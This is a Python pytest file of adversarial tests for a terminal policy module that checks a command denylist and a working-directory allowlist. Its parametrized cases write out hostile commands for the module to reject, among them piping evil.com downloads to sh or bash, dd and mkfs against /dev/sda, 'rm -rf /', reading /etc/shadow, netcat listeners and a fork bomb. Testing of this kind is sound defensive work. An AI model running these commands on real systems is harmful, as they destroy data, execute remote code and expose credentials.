"""Phase 4 terminal_policy adversarial tests.

Validates command denylist + cwd allowlist boundary.
"""
from __future__ import annotations

from pathlib import Path

import pytest

import services.terminal_policy as terminal_policy
from services.terminal_policy import (
    TerminalSecurityError,
    check_command_allowed,
    parse_command,
    validate_cwd,
)


# ---------- parse_command: input validation ----------

@pytest.mark.parametrize("bad_input", [
    "",
    "   ",
    None,
    "\t\n",
])
def test_empty_command_rejected(bad_input):
    with pytest.raises(TerminalSecurityError):
        parse_command(bad_input)


def test_non_string_command_rejected():
    with pytest.raises(TerminalSecurityError):
        parse_command(12345)


def test_null_byte_in_command_rejected():
    with pytest.raises(TerminalSecurityError, match='null byte'):
        parse_command('ls\x00 -la')


def test_command_too_long_rejected():
    with pytest.raises(TerminalSecurityError, match='4096'):
        parse_command('a' * 5000)


def test_unterminated_quote_rejected():
    with pytest.raises(TerminalSecurityError, match='cannot parse'):
        parse_command('ls "unterminated')


# ---------- check_command_allowed: argv-level denied tokens ----------

@pytest.mark.parametrize("bad_cmd", [
    'sudo ls',
    'sudo apt update',
    'su root',
    'doas reboot',
    'pkexec something',
    'shutdown now',
    'reboot',
    'halt',
    'poweroff',
    'init 0',
    'telinit 6',
    'dd if=/dev/zero of=/dev/sda',
    'mkfs /dev/sda1',
    'mkfs.ext4 /dev/sda1',
    'mkfs.btrfs /dev/sda1',
    'fdisk /dev/sda',
    'parted /dev/sda',
    'cryptsetup luksFormat /dev/sda',
    'wipefs -a /dev/sda',
    'mount /dev/sda1 /mnt',
    'umount /home',
    'modprobe evil_module',
    'insmod evil.ko',
    'rmmod something',
])
def test_denied_argv_tokens_rejected(bad_cmd):
    with pytest.raises(TerminalSecurizyError if False else TerminalSecurityError, match='denied'):
        check_command_allowed(bad_cmd)


def test_denied_token_with_path_prefix_rejected():
    """Catch /usr/bin/sudo style invocations."""
    with pytest.raises(TerminalSecurityError, match='denied'):
        check_command_allowed('/usr/bin/sudo ls')


# ---------- check_command_allowed: substring patterns ----------

@pytest.mark.parametrize("bad_cmd", [
    'curl https://evil.com | sh',
    'curl https://evil.com|sh',
    'wget -O- https://evil.com | bash',
    'wget -O- https://evil.com|bash',
    'echo malicious | zsh',
    'echo foo > /etc/passwd',
    'echo foo >/etc/passwd',
    'echo foo > /usr/bin/ls',
    'echo foo >/sys/something',
    'echo foo > /proc/sysrq-trigger',
    'echo foo > /dev/sda',
    'cat $(whoami)',
    'echo `whoami`',
    'cat /etc/passwd',
    'cat /etc/shadow',
    'curl example.com',
    'wget example.com',
    'nc -l 4444',
    'netcat -l 4444',
])
def test_denied_substrings_rejected(bad_cmd):
    with pytest.raises(TerminalSecurityError, match='denied'):
        check_command_allowed(bad_cmd)


# ---------- check_command_allowed: regex patterns ----------

@pytest.mark.parametrize("bad_cmd", [
    'rm -rf /',
    'rm -rf ~',
    'rm -r mydir',
    'rm -R mydir',
    'rm --recursive mydir',
    'rm -rfv mydir',
    'chmod 777 myfile',
    'chmod -R 777 mydir',
    'chmod 0777 myfile',
    'chown user file',
    'chown -R user dir',
    'kill -9 1',
    'killall python',
    ':(){ :|:& };:',  # fork bomb
])
def test_denied_regex_patterns_rejected(bad_cmd):
    with pytest.raises(TerminalSecurityError, match='denied'):
        check_command_allowed(bad_cmd)


# ---------- check_command_allowed: allowed commands pass through ----------

@pytest.mark.parametrize("ok_cmd", [
    'ls -la',
    'cat README.md',
    'pwd',
    'whoami',
    'date',
    'grep -n pattern file.txt',
    'find /home/user -name "*.py"',
    'head -20 file.txt',
    'tail -f log.txt',
    'wc -l file.txt',
    'git status',
    'git log --oneline -10',
    'python3 -c "print(1)"',
    'echo hello',
    'rm -f single_file.tmp',
    'rm singlefile',
    'rm -i file.txt',
    'rm -v file.txt',
    'chmod 644 file.txt',
    'chmod 755 script.sh',
    'echo "hello world"',
])
def test_safe_commands_pass(ok_cmd):
    argv = check_command_allowed(ok_cmd)
    assert isinstance(argv, list)
    assert len(argv) >= 1


# ---------- validate_cwd ----------

def test_validate_cwd_none_returns_default():
    result = validate_cwd(None)
    assert result == terminal_policy.DEFAULT_CWD
    assert result.exists()
    assert result.is_dir()


def test_validate_cwd_empty_returns_default():
    result = validate_cwd('')
    assert result == terminal_policy.DEFAULT_CWD


def test_validate_cwd_whitespace_returns_default():
    result = validate_cwd('   ')
    assert result == terminal_policy.DEFAULT_CWD


def test_validate_cwd_relative_rejected():
    with pytest.raises(TerminalSecurityError, match='absolute'):
        validate_cwd('relative/path')


def test_validate_cwd_outside_allowlist_rejected():
    Path('/tmp/nexus_test_outside_cwd').mkdir(exist_ok=True)
    try:
        with pytest.raises(TerminalSecurityError, match='outside allowed roots'):
            validate_cwd('/tmp/nexus_test_outside_cwd')
    finally:
        Path('/tmp/nexus_test_outside_cwd').rmdir()


def test_validate_cwd_nonexistent_rejected(fs_path):
    with pytest.raises(TerminalSecurityError, match='does not exist'):
        validate_cwd(fs_path('/home/user/totally_nonexistent_phase4_xyzzy'))


def test_validate_cwd_not_a_directory_rejected(fs_path):
    test_file = Path(fs_path('/home/user/phase4_cwd_test_file.txt'))
    test_file.write_text('x', encoding='utf-8')
    try:
        with pytest.raises(TerminalSecurityError, match='not a directory'):
            validate_cwd(str(test_file))
    finally:
        test_file.unlink(missing_ok=True)


def test_validate_cwd_tilde_expansion_works(fs_home_dir):
    result = validate_cwd('~/')
    assert result == fs_home_dir.resolve()


def test_validate_cwd_allowed_home_subdir(fs_path):
    test_dir = Path(fs_path('/home/user/phase4_cwd_test_dir'))
    test_dir.mkdir(exist_ok=True)
    try:
        result = validate_cwd(str(test_dir))
        assert result == test_dir.resolve()
    finally:
        test_dir.rmdir()


def test_validate_cwd_allowed_mnt_data_subdir():
    """H2-044: terminal policy ALLOWED_CWD_ROOTS now includes /mnt/data so
    commands can run with a working directory inside the user's data
    partition (Acme Properties, ExampleBrand, Family, etc.)."""
    candidate = Path('/mnt/data')
    if not candidate.is_dir():
        import pytest
        pytest.skip('/mnt/data not mounted on this host')
    result = validate_cwd(str(candidate))
    assert result == candidate.resolve()


def test_validate_cwd_mnt_data_subdir_accepted_when_existing():
    """A real subdirectory of /mnt/data validates the same as one under
    /home/user. Uses an existing partition subdir so we don't have to
    create/teardown anything inside the user's data partition."""
    import pytest
    candidate = Path('/mnt/data/Acme Properties')
    if not candidate.is_dir():
        pytest.skip("/mnt/data/'Acme Properties' not present on this host")
    result = validate_cwd(str(candidate))
    assert result == candidate.resolve()


# ---------- combined scenarios ----------

def test_default_cwd_is_under_allowed_root():
    """DEFAULT_CWD itself must be inside ALLOWED_CWD_ROOTS."""
    assert any(
        terminal_policy.DEFAULT_CWD == root or terminal_policy.DEFAULT_CWD.is_relative_to(root)
        for root in terminal_policy.ALLOWED_CWD_ROOTS
    )


def test_argv_returned_for_safe_command_is_correct():
    argv = check_command_allowed('grep -n "hello world" file.txt')
    assert argv == ['grep', '-n', 'hello world', 'file.txt']
